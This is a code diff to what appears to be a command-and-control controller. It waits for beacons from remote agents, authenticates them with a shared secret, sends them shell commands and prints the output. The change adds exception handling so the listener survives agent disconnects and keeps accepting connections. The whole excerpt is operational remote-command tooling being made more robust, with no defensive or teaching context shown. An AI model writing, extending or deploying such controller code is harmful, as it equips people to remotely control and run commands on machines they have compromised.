@@ -76,24 +76,31 @@ def main():
             print("[*] Closing connection")
             sys.exit(0)
 
-        # Now wait for the next beacon
-        conn, addr = secure_server.accept()
-        # print(f"[+] Connection from {addr}")
+        try:
+            # Now wait for the next beacon
+            conn, addr = secure_server.accept()
+            # print(f"[+] Connection from {addr}")
 
-        if not authenticate(conn, SECRET):
+            if not authenticate(conn, SECRET):
+                conn.close()
+                continue
+
+            conn.sendall(command.encode())
+
+            output = conn.recv(8192)
+
+            if not output and not "cd" in command:
+                print("[-] No response")
+            else:
+                print(output.decode())
+
             conn.close()
-            continue
-
-        conn.sendall(command.encode())
-
-        output = conn.recv(8192)
-
-        if not output and not "cd" in command:
-            print("[-] No response")
-        else:
-            print(output.decode())
-
-        conn.close()
+        except (ConnectionResetError, BrokenPipeError):
+            print("[-] Agent disconnected. Going back to listening...")
+            continue # This loops back to s.accept() instead of crashing!
+        except KeyboardInterrupt:
+            print("\n[!] Shutting down controller.")
+            break
 
 
 if __name__ == "__main__":
